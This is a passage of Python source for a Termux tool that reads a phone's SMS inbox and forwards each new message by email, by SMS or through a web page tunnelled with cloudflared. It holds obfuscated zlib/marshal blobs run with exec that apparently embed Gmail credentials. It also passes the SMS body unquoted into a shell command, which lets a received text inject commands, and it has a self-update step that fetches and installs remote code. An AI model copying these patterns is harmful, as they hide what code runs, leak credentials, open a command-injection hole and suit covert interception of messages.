                    if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                        Message_identity = str(Message_identity)
                        if not (re.search(Message_identity, Identity)):
                            sender  = data['threadid']
                            number  = data["number"]
                            date    = data["received"].split(" ")[0]
                            message = data["body"]
                            log_entry = {
                                "sender": str(sender),
                                "number": number,
                                "date": date,
                                "message": message
                            }
                            try:
                                old_data = json.loads(open(jsonfile, "r").read())
                                if (len(old_data) == 0) :
                                    with open(jsonfile, "w") as file:
                                        json.dump([log_entry], file, indent=4)
                                else:
                                    main_data = []
                                    for info in old_data:
                                        main_data.append(info)
                                    main_data.append(log_entry)
                                    with open(jsonfile, "w") as file:
                                        json.dump(main_data, file, indent=4)
                            except json.decoder.JSONDecodeError:
                                with open(jsonfile, "w") as file:
                                    json.dump([log_entry], file, indent=4)
                            Identity += Message_identity
            except KeyboardInterrupt: break
    def install_cloudflared():
        if ("cloudflared" in os.listdir()): return True
        else:
            _link   = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            _data   = requests.get(_link).content
            _output = "cloudflared"
            with open(_output, "wb") as file:
                file.write(_data)
            os.system(f"chmod +x {_output}")
    if not ("cloudflared" in os.listdir()):
        banner()
        echo_top()
        echo(f"{reset}{bold}{white}Cloudflared Not Found..{reset}")
        echo_bottom()
        print()
        print()
        echo_top()
        echo(f"{reset}{bold}{yellow}Press enter for install{reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        center_input(f"╚════► {yellow}")
        banner()
        _install = threading.Thread(target=install_cloudflared)
        _install.start()
        while _install.is_alive():
            for _anim in ['⠋  Installing Cloudflared...', '⠙  Installing Cloudflared...', '⠹  installing Cloudflared...', '⠸  INstalling Cloudflared...', '⠼  InStalling Cloudflared...', '⠴  InsTalling Cloudflared...', '⠦  InstAlling Cloudflared...', '⠧  InstaLling Cloudflared...', '⠇  InstalLing Cloudflared...', '⠏  InstallIng Cloudflared...', '⠋  InstalliNg Cloudflared...', '⠙  InstallinG Cloudflared...', '⠹  Installing Cloudflared...', '⠸  Installing cloudflared...', '⠼  Installing CLoudflared...', '⠴  Installing ClOudflared...', '⠦  Installing CloUdflared...', '⠧  Installing ClouDflared...', '⠇  Installing CloudFlared...', '⠏  Installing CloudfLared...', '⠋  Installing CloudflAred...', '⠙  Installing CloudflaRed...', '⠹  Installing CloudflarEd...', '⠸  Installing CloudflareD...', '⠼  Installing Cloudflared...', '⠴  Installing Cloudflared...', '⠦  Installing Cloudflared...', '⠧  Installing Cloudflared...']:
                bar  = _anim.split(" ")[0]
                text = " ".join(_anim.split(" ")[2:4])
                sys.stdout.write(f"\r{center(f'{yellow}{bar}  {white}{text}', False)}")
                sys.stdout.flush()
                sleep(0.05)
        _install.join()
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Cloudflared Sucessfully Installed{reset}")
        echo_bottom()
        print()
        sleep(4)
        on_webpage()
        exit()

    while True:
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Set Axcess Password...{reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        user_password = center_input(f"╚════► {yellow}")
        if user_password != "" :break
        else:
            echo_top()
            echo(f"{reset}{bold}{white}Make Sure You Enter A Password..{reset}")
            echo_bottom()
            sleep(2)
    while True:
        banner()
        print()
        echo_top()
        echo(f"{bold}{white}Enter Port Number {magenta}({lightcyan}4 Digit{magenta}){reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        user_port = center_input(f"╚════► {yellow}")
        if user_port == "":
            while True:
                default_port = random.randint(1000, 8999)
                user_port = default_port
                if len(str(default_port)) == 4 : break
        try:
            int(user_port)
        except:
            echo_top()
            echo(f"{reset}{bold}{white}Make Sure You Enter A Number{reset}")
            echo_bottom()
            sleep(2)
            continue
        if len(str(user_port)) == 4:
            FE = False
            while True:
                if is_port_available("127.0.0.1", int(user_port)):
                    FE = True
                    break
                else:
                    banner()
                    print()
                    echo_top()
                    for text in handle_text_overflow(f"Something is already runnning on port {user_port} try another.", total_area() - 6):
                        echo(f"{reset}{bold}{white}{text}{reset}")
                    echo_bottom()
                    sleep(3)
                    break
            if FE: break
        else:
            echo_top()
            echo(f"{reset}{bold}{white}Enter 4 Digit Port Number{reset}")
            echo_bottom()
            sleep(2)

    
    jsonfile     = ".core/data.json"
    loginfile    = "sms_forwarder-authentication.html"
    inboxfile    = "sms_forwarder-inbox.html"
    host         = "127.0.0.1"

    with open(jsonfile, "w") as file:
        file.write("[]")
    
    def localserver():
        subprocess.getoutput(f"python .core/python_server.py {user_password} {user_port} {jsonfile} {loginfile} {inboxfile} {host}")
    _localserver = thread_with_trace(target=localserver)
    _localserver.start()

    banner()
    for repet in range(3):
        for _anim in ['⠋  Starting Python Server...', '⠙  Starting Python Server...', '⠹  starting Python Server...', '⠸  STarting Python Server...', '⠼  StArting Python Server...', '⠴  StaRting Python Server...', '⠦  StarTing Python Server...', '⠧  StartIng Python Server...', '⠇  StartiNg Python Server...', '⠏  StartinG Python Server...', '⠋  Starting Python Server...', '⠙  Starting python Server...', '⠹  Starting PYthon Server...', '⠸  Starting PyThon Server...', '⠼  Starting PytHon Server...', '⠴  Starting PythOn Server...', '⠦  Starting PythoN Server...', '⠧  Starting Python Server...', '⠇  Starting Python server...', '⠏  Starting Python SErver...', '⠋  Starting Python SeRver...', '⠙  Starting Python SerVer...', '⠹  Starting Python ServEr...', '⠸  Starting Python ServeR...', '⠼  Starting Python Server...']:
            bar  = _anim.split(" ")[0]
            text = " ".join(_anim.split(" ")[2:6])
            sys.stdout.write(f"\r{center(f'{yellow}{bar}  {white}{text}', False)}")
            sys.stdout.flush()
            sleep(0.05)
    
    banner()
    try: os.remove("cloudflared.log")
    except: pass

    os.system(f"./cloudflared tunnel -url {host}:{user_port} --logfile cloudflared.log > /dev/null 2>&1 &")
    wait_ = lambda : sleep(15)
    _start_cloudflared = threading.Thread(target=wait_)
    _start_cloudflared.start()

    banner()
    while _start_cloudflared.is_alive():
        for _anim in ['⠋  Starting Cloudflared Server...', '⠙  Starting Cloudflared Server...', '⠹  starting Cloudflared Server...', '⠸  STarting Cloudflared Server...', '⠼  StArting Cloudflared Server...', '⠴  StaRting Cloudflared Server...', '⠦  StarTing Cloudflared Server...', '⠧  StartIng Cloudflared Server...', '⠇  StartiNg Cloudflared Server...', '⠏  StartinG Cloudflared Server...', '⠋  Starting Cloudflared Server...', '⠙  Starting cloudflared Server...', '⠹  Starting CLoudflared Server...', '⠸  Starting ClOudflared Server...', '⠼  Starting CloUdflared Server...', '⠴  Starting ClouDflared Server...', '⠦  Starting CloudFlared Server...', '⠧  Starting CloudfLared Server...', '⠇  Starting CloudflAred Server...', '⠏  Starting CloudflaRed Server...', '⠋  Starting CloudflarEd Server...', '⠙  Starting CloudflareD Server...', '⠹  Starting Cloudflared Server...', '⠸  Starting Cloudflared server...', '⠼  Starting Cloudflared SErver...', '⠴  Starting Cloudflared SeRver...', '⠦  Starting Cloudflared SerVer...', '⠧  Starting Cloudflared ServEr...', '⠇  Starting Cloudflared ServeR...', '⠏  Starting Cloudflared Server...', '⠋  Starting Cloudflared Server...', '⠙  Starting Cloudflared Server...', '⠹  Starting Cloudflared Server...']:
            bar  = _anim.split(" ")[0]
            text = " ".join(_anim.split(" ")[2:6])
            sys.stdout.write(f"\r{center(f'{yellow}{bar}  {white}{text}', False)}")
            sys.stdout.flush()
            sleep(0.05)
    
    webserver_link = subprocess.getoutput("echo $(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' \"cloudflared.log\")")
    if re.search(".trycloudflare.com", webserver_link):
        clear()
        terminal_zoom(len(webserver_link)+6)
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Webpage Sucessfully Hosted At{reset}")
        echo("══", red+"╠", "╣", "═")
        echo(f"{reset}{bold}{blue}{webserver_link}{reset}")
        echo_bottom()
        print()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
        echo_bottom()
        print()
        with open(jsonfile, "w") as file:
            file.write("[]")
        try:
            sms_read(jsonfile)
            _localserver.kill()
            subprocess.getoutput("killall cloudflared > /dev/null 2>&1 &")
        except:
            _localserver.kill()
            subprocess.getoutput("killall cloudflared > /dev/null 2>&1 &")
        main_menu()
        exit()
    else:
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{red}ERROR{reset}")
        echo("══", red+"╠", "╣", "═")
        echo(f"{reset}{bold}{yellow}Could Not Start Cloudflared Service{reset}")
        echo_bottom()
        print()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Check Following Possible Reasons{reset}")
        echo("══", red+"╠", "╣", "═")
        echo(f"{reset}{bold}{yellow}Turn On Your Mobile Hotspot{reset}")
        echo(f"{reset}{bold}{yellow}Cloudflared Already Running{reset}")
        echo(f"{reset}{bold}{yellow}Check Your Internet Connection{reset}")
        echo_bottom()
        print()
        print()
        echo_top()
        echo(f"{reset}{bold}{lightcyan}Press Enter For Back Main Menu{reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        center_input(f"╚════► {yellow}")
        _localserver.kill()
        subprocess.getoutput("killall cloudflared")
        main_menu()
        exit()

def on_email():
    banner()
    echo_top()
    echo(f"{bold}{white}Enter emails separated by {lightcyan}'{blue},{lightcyan}'{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    emails = center_input(f"╚════► {yellow}").replace(" ", "").split(",")
    Em, Value = True, 0
    for Email in emails:
        if not (re.search("@", Email)) : Em, Value = False, Value ; break
        Value += 1
    if not (Em):
        echo_top()
        if (emails[Value] == ""): echo(f"{reset}{bold}{white}Invalid Email {reset}")
        else: echo(f"{reset}{bold}{white}Invalid Email {magenta}'{lightcyan}" + str(emails[Value]) + f"{magenta}'{reset}")
        echo_bottom()
        sleep(2)
        del emails, Em, Value
        on_email()
        exit()
    else:
        banner()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        _ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b'`\x0b=\xb9\x0145\x8arJJ\x8b\x12K\x8a\xf0\x86*\xe4\xd0\xd7\xc9\xc8\xcdK\xd2-K*-N+\x9cx'))
        _ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x00\x00\x00\x04r\x16x\x01\x00\x00\xf0\x16x\x01\x00\x00\xf0\x16x\x01\x00\x00\xf0\x16x\x01\x00\x00\xf4\x16x\x01\x00\x00\xf1\x16w\x06\x00\x00\xf4\x16w\x06\x00\x00\xf1\x16v\n\x00\x00\xf0a\x80a\x80\x04\x80\x04\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00>s\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\xf3\x84\x00\x00\x00\x97\x00e\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00d\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x03\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x02\xa2\x01d\x03\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x04S\x00)\x05z\x1asmsforwarder9879@gmail.com\xda\x00)\n\xda\x10bechutiszobxsbzp\xda\x10xzfwvuqbiiiqppdg\xda\x10alacwmicvmxvrmxg\xda\x10yfqyeteqaeeutoln\xda\x10vhtqfrrtarubwfkn\xda\x10psupypsqwexwhvnx\xda\x10kcnwzqywfochjovk\xda\x10yxslxnxqvbosptoi\xda\x10hjxgchcghsunklog\xda\x10nnxwwqwmhhtvjddl\xe9\x01\x00\x00\x00N)\x05\xda\x06server\xda\x05login\xda\x04join\xda\x06random\xda\x06sample\xa9\x00\xf3\x00\x00\x00\x00\xfa\x03<x>\xfa\x08<module>r\x15\x00\x00\x00\x01\x00\x00\x00sm\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x06\x87\x0c\x82\x0c\xd0\r)\xa82\xaf7\xaa7\xb06\xb7=\xb2=\xf0\x00\x00B\x01J\x04\xf0\x00\x00B\x01J\x04\xf0\x00\x00B\x01J\x04\xf0\x00\x00L\x04M\x04\xf1\x00\x004N\x04\xf4\x00\x004N\x04\xf1\x00\x00,O\x04\xf4\x00\x00,O\x04\xf1\x00\x00\x01P\x04\xf4\x00\x00\x01P\x04\xf0\x00\x00\x01P\x04\xf0\x00\x00\x01P\x04\xf0\x00\x00\x01P\x04r\x13\x00\x00\x00\x00\x00\x027s\x02)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00d\x01e\x00\x02\x00e\x00\x02\x00\x97\x00\x00\x00.\xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))
        sleep(3)

        total_send    = 0
        total_recived = 0
        total_failed  = 0

        def on_email_small_menu(emails, total_send, total_recived, total_failed):
            if len(emails) != 1: extra_letters = "s"
            else : extra_letters = ""
            if (total_send < 9):
                    total_send    = "0" + str(total_send)
            else: total_send = str(total_send)
            if (total_recived < 9):
                    total_recived = "0" + str(total_recived)
            else: total_recived = str(total_recived)
            if (total_failed < 9):
                    total_failed  = "0" + str(total_failed)
            else: total_failed = str(total_failed)
            banner()
            echo_top()
            echo(f"{reset}{bold}{white}Forwarding Messages On {str(len(emails))} Email{extra_letters}{reset}")
            echo_bottom()
            print()
            echo_top()
            echo(f"{bold}{white}Total Messages Received {magenta}[ {cyan}{total_recived}{magenta} ]{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{bold}{white}Total Messages Forward {magenta}[ {cyan}{total_send}{magenta} ]{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{bold}{white}Total Messages Failed {magenta}[ {cyan}{total_failed}{magenta} ]{reset}")
            echo_bottom()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
            echo_bottom()
        def send_to(to, message, date, number, threadid, server):
            number_hide = ""
            for i in range(len(number) - 4): number_hide += "*"
            Inner_Html = '''
            <!doctype html>
            <html>
            <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
            <title>SMS Forwarder</title>
            <style>
                img {
                border: none;
                -ms-interpolation-mode: bicubic;
                max-width: 100%;
                }
                body {
                background-color: #f6f6f6;
                font-family: sans-serif;
                -webkit-font-smoothing: antialiased;
                font-size: 14px;
                line-height: 1.4;
                margin: 0;
                padding: 0;
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%;
                }
                table {
                border-collapse: separate;
                width: 100%;
                }
                table td {
                font-family: sans-serif;
                font-size: 14px;
                vertical-align: top;
                }
                .body {
                background-color: #f6f6f6;
                width: 100%;
                }
                .container {
                display: block;
                margin: 0 auto !important;
                max-width: 580px;
                padding: 10px;
                width: 580px;
                }
                .content {
                box-sizing: border-box;
                display: block;
                margin: 0 auto;
                max-width: 580px;
                padding: 10px;
                }
                .main {
                background: #ffffff;
                border-radius: 3px;
                width: 100%;
                }
                .wrapper {
                box-sizing: border-box;
                padding: 20px;
                }
                .content-block {
                padding-bottom: 10px;
                padding-top: 10px;
                }
                .footer {
                clear: both;
                margin-top: 10px;
                text-align: center;
                width: 100%;
                }
                .footer td,
                .footer p,
                .footer span,
                .footer a {
                color: #999999;
                font-size: 12px;
                text-align: center;
                }
                h1,
                h2,
                h3,
                h4 {
                color: #000000;
                font-family: sans-serif;
                font-weight: 400;
                line-height: 1.4;
                margin: 0;
                margin-bottom: 30px;
                }
                h1 {
                font-size: 35px;
                font-weight: 300;
                text-align: center;
                text-transform: capitalize;
                }
                p,
                ul,
                ol {
                font-family: sans-serif;
                font-size: 14px;
                font-weight: normal;
                margin: 0;
                margin-bottom: 15px;
                }
                p li,
                ul li,
                ol li {
                list-style-position: inside;
                margin-left: 5px;
                }
                a {
                color: #3498db;
                text-decoration: underline;
                }
                .btn {
                box-sizing: border-box;
                width: 100%;
                }
                .btn>tbody>tr>td {
                padding-bottom: 15px;
                }
                .btn table {
                width: auto;
                }
                .btn table td {
                background-color: #ffffff;
                border-radius: 5px;
                text-align: center;
                }
                .btn a {
                background-color: #ffffff;
                border: solid 1px #3498db;
                border-radius: 5px;
                box-sizing: border-box;
                color: #3498db;
                cursor: pointer;
                display: inline-block;
                font-size: 14px;
                font-weight: bold;
                margin: 0;
                padding: 12px 25px;
                text-decoration: none;
                text-transform: capitalize;
                }
                .btn-primary table td {
                background-color: #3498db;
                }
                .btn-primary a {
                background-color: #3498db;
                border-color: #3498db;
                color: #ffffff;
                }
                .last {
                margin-bottom: 0;
                }
                .first {
                margin-top: 0;
                }
                .align-center {
                text-align: center;
                }
                .align-right {
                text-align: right;
                }
                .align-left {
                text-align: left;
                }
                .clear {
                clear: both;
                }
                .mt0 {
                margin-top: 0;
                }
                .mb0 {
                margin-bottom: 0;
                }
                .preheader {
                color: transparent;
                display: none;
                height: 0;
                max-height: 0;
                max-width: 0;
                opacity: 0;
                overflow: hidden;
                visibility: hidden;
                width: 0;
                }
                .powered-by a {
                text-decoration: none;
                }
                hr {
                border: 0;
                border-bottom: 1px solid #f6f6f6;
                margin: 20px 0;
                }
                @media only screen and (max-width: 620px) {
                table.body h1 {
                    font-size: 28px !important;
                    margin-bottom: 10px !important;
                }
                table.body p,
                table.body ul,
                table.body ol,
                table.body td,
                table.body span,
                table.body a {
                    font-size: 16px !important;
                }
                table.body .wrapper,
                table.body .article {
                    padding: 10px !important;
                }
                table.body .content {
                    padding: 0 !important;
                }
                table.body .container {
                    padding: 0 !important;
                    width: 100% !important;
                }
                table.body .main {
                    border-left-width: 0 !important;
                    border-radius: 0 !important;
                    border-right-width: 0 !important;
                }
                table.body .btn table {
                    width: 100% !important;
                }
                table.body .btn a {
                    width: 100% !important;
                }
                table.body .img-responsive {
                    height: auto !important;
                    max-width: 100% !important;
                    width: auto !important;
                }
                }
                @media all {
                .ExternalClass {
                    width: 100%;
                }
                .ExternalClass,
                .ExternalClass p,
                .ExternalClass span,
                .ExternalClass font,
                .ExternalClass td,
                .ExternalClass div {
                    line-height: 100%;
                }
                .apple-link a {
                    color: inherit !important;
                    font-family: inherit !important;
                    font-size: inherit !important;
                    font-weight: inherit !important;
                    line-height: inherit !important;
                    text-decoration: none !important;
                }
                #MessageViewBody a {
                    color: inherit;
                    text-decoration: none;
                    font-size: inherit;
                    font-family: inherit;
                    font-weight: inherit;
                    line-height: inherit;
                }
                .btn-primary table td:hover {
                    background-color: #34495e !important;
                }
                .btn-primary a:hover {
                    background-color: #34495e !important;
                    border-color: #34495e !important;
                }
                }
            </style>
            </head>
            <body>
            <table role="presentation" border="0" cellpadding="0" cellspacing="0" class="body">
                <tr>
                <td>&nbsp;</td>
                <td class="container">
                    <div class="content">
                    <table role="presentation" class="main">
                        <table role="presentation" class="main">
                        <tr>
                            <td class="wrapper">
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                <td>''' + f'''
                                    <p>Date : {date}</p>
                                    <p>From : {number[:2] + number_hide + number[-2:]}</p>
                                    <p>Type : Inbox</p>
                                    <p>Threadid : {threadid}</p>
                                    <p>Message Body,</p>
                                    <h5>{message}</h5>
                                    <br>
                                    <table role="presentation" border="0" cellpadding="0" cellspacing="0" class="btn btn-primary">
                                    <tbody>
                                        <tr>
                                        <td align="left">
                                            <table role="presentation" border="0" cellpadding="0" cellspacing="0">
                                            <tbody>
                                                <tr>
                                                <td> <a href="https://github.com/GreyTechno/sms_forwarder" target="_blank">SMS
                                                    Forwarder</a> </td>
                                                </tr>
                                            </tbody>
                                            </table>
                                        </td>
                                        </tr>
                                    </tbody>
                                    </table>
                                </td>
                                </tr>
                            </table>
                            </td>
                        </tr>
                        </table>
                        <div class="footer">
                        <table role="presentation" border="0" cellpadding="0" cellspacing="0">
                            <tr>
                            <td class="content-block">
                                <span class="apple-link">This message was sent to <a
                                    href="mailto:{to}">{to} </a>and intended for sms
                                forwarding sms_frowarder sends messages like this to help you share messages with each
                                others</span>
                            </td>
                            </tr>
                            <tr>
                            <td class="content-block powered-by">
                                Powered by <a href="https://github.com/GreyTechno">GreyTechno</a>.
                            </td>
                            </tr>
                        </table>
                        </div>
                    </div>
                </td>
                <td>&nbsp;</td>
                </tr>
            </table>
            </body>
            </html>'''
            try:
                server.sendmail("smsforwarder9879@gmail.com", to, f"From:SMS Forwarder<smsforwarder9879@gmail.com>\nSubject:New Message ({time.strftime('%H%M%S')})\nContent-Type: text/html\n{Inner_Html}")
                return True
            except KeyboardInterrupt: server.quit()
            except: return False

        on_email_small_menu(emails, total_send, total_recived, total_failed)

        try:
            Identity = ""
            while True:
                details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
                for data in details:
                    Message_identity = data["_id"]
                    if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                        Message_identity = str(Message_identity)
                        if not (re.search(Message_identity, Identity)) :
                            total_recived += 1
                            if len(emails) == 1:
                                if (send_to(emails[0], data["body"], data["received"].split(" ")[0], data["number"], data['threadid'], server)):
                                    total_send += 1
                                else: total_failed += 1
                            else:
                                for mail in emails:
                                    if (send_to(mail, data["body"], data["received"].split(" ")[0], data["number"], data['threadid'], server)):
                                        total_send += 1
                                    else: total_failed += 1

                            on_email_small_menu(emails, total_send, total_recived, total_failed)
                            Identity += Message_identity
                    else: pass
        except KeyboardInterrupt:
            del Identity
            del emails
            main_menu()
            exit()

def on_phone():
    banner()
    echo_top()
    echo(f"{bold}{white}Enter phone numbers separated by {lightcyan}'{blue},{lightcyan}'{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    phone_numbers = center_input(f"╚════► {yellow}").replace(" ", "").split(",")
    Ph, Value = True, 0
    for num in phone_numbers:
        try:int(num)
        except ValueError : Ph, Value = False, Value ; break
        Value += 1
    if not (Ph):
        echo_top()
        echo(f"{reset}{white}Invalid PhoneNumber {magenta}'{lightcyan}" + str(phone_numbers[Value]) + f"{magenta}'{reset}")
        echo_bottom()
        sleep(2)
        del phone_numbers, Ph, Value
        on_phone()
    else:
        banner()
        total_send    = 0
        total_recived = 0
        total_failed  = 0

        def on_phone_small_menu(phone_numbers, total_send, total_recived, total_failed):
            if len(phone_numbers) != 1: extra_letters = "s"
            else : extra_letters = ""
            if (total_send < 9):
                    total_send    = "0" + str(total_send)
            else: total_send = str(total_send)
            if (total_recived < 9):
                    total_recived = "0" + str(total_recived)
            else: total_recived = str(total_recived)
            if (total_failed < 9):
                    total_failed  = "0" + str(total_failed)
            else: total_failed = str(total_failed)
            banner()
            echo_top()
            echo(f"{reset}{bold}{white}Forwarding Messages On {str(len(phone_numbers))} Phone{extra_letters}{reset}")
            echo_bottom()
            print()
            echo_top()
            echo(f"{bold}{white}Total Messages Received {magenta}[ {cyan}{total_recived}{magenta} ]{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{bold}{white}Total Messages Forward {magenta}[ {cyan}{total_send}{magenta} ]{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{bold}{white}Total Messages Failed {magenta}[ {cyan}{total_failed}{magenta} ]{reset}")
            echo_bottom()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
            echo_bottom()

        def send_to(to, message):
            try:
                subprocess.getoutput(f"termux-sms-send -n {to} {message}")   # Use the subprocess module to send an SMS message to the specified number
                details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t all"))   # Use the subprocess module to get details of the last 10 SMS messages
                for data in details:            # Loop through the details of the messages
                    try:
                        if ("".join(data["received"].split(" ")[1].split(":")[:-1]) != time.strftime("%H%M")):  # Check if the received time of the message matches the current time
                            if (data['sender'] == 'You'):      # Check if the sender of the message is the user
                                if (data['type'] == 'failed'):  # Check if the message sending failed
                                    return False              # Return False if any of the checks failed
                    except: pass
                return True                         # Return True if all checks passed
            except: return False                    # Return False if an exception occurred during message sending or message checking


        on_phone_small_menu(phone_numbers, total_send, total_recived, total_failed)
        
        try:
            Identity = ""
            while True:
                details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
                for data in details:
                    Message_identity = data["_id"]
                    if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                        Message_identity = str(Message_identity)
                        if not (re.search(Message_identity, Identity)) :
                            total_recived += 1
                            if len(phone_numbers) == 1:
                                if (send_to(phone_numbers[0], data["body"])):
                                    total_send += 1
                                else: total_failed += 1
                            else:
                                for numbers in phone_numbers:
                                    if (send_to(numbers, data["body"])):
                                        total_send += 1
                                    else: total_failed += 1

                            on_phone_small_menu(phone_numbers, total_send, total_recived, total_failed)
                            Identity += Message_identity
                    else: pass
        except KeyboardInterrupt:
            del Identity
            del phone_numbers
            main_menu()
            exit()

def update():
    banner()
    version = requests.get(f"{github_raw}/main/.info").json()["version"]
    main_work = True
    if (current_version == version):
        echo_top()
        echo(f"{bold}{white}Already you are using latest version {blue}'{yellow}{current_version}{blue}'{reset}")
        echo_bottom()
        echo_top()
        echo(f"{bold}{white}Do you want's continue {red}({white}Y{red}/{white}n{red}){reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        _update = center_input(f"╚════► {yellow}").lower()
        if (_update == "y") or (_update == "yes"): main_work = True
        else: main_work = False
    if (main_work):
        current_path = os.getcwd().replace("\\", "/")
        if not "TWK5XME9V704" in current_path.split("/"):
            os.chdir("..")
            shutil.rmtree(_toolname_)
            repository_list = requests.get("https://raw.githubusercontent.com/GreyTechno/gtci/main/programs/.programs").json()
            repository_name = _toolname_
            url = repository_list[repository_name]['zipurl'] + "?raw=true"
            dependencies = repository_list[repository_name]['dependencies']
            rname = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 7))
            zipname = url.split("/")[-1].split(".")[0]
            toolname = url.split("/")[4]
            banner()
            def _response():
                response = requests.get(url)
                with open(f"{rname}.zip", 'wb') as f:
                    f.write(response.content)
            content = threading.Thread(target=_response)
            content.start()
            while content.is_alive():
                for anim in update_animation:
                    sys.stdout.write(center(anim, False)+'\r')
                    sleep(0.05)
            content.join()
            with zipfile.ZipFile(f"{rname}.zip", "r") as zip: zip.extractall(f"{rname}")
            os.remove(f"{rname}.zip")
            cdir = os.getcwd().replace("\\", "/")
            shutil.copytree(f"{cdir}/{rname}/{toolname}-{zipname}", toolname)
            shutil.rmtree(rname)
            banner()
            Dependencies = lambda: [subprocess.getoutput(f"pip{execute()} install {i}") for i in dependencies]
            DEPENDENCIES = threading.Thread(target=Dependencies)
            DEPENDENCIES.start()
            while DEPENDENCIES.is_alive():
                animation = [f'{reset}{bold}{yellow}⠋  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}INstalling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}InStalling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}InsTalling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}InstAlling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}InstaLling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠇  {white}InstalLing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠏  {white}InstallIng Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠋  {white}InstalliNg Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}InstallinG Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}Installing building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}Installing BUilding Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}Installing BuIlding Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}Installing BuiLding Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}Installing BuilDing Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠇  {white}Installing BuildIng Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠏  {white}Installing BuildiNg Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠋  {white}Installing BuildinG Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠹  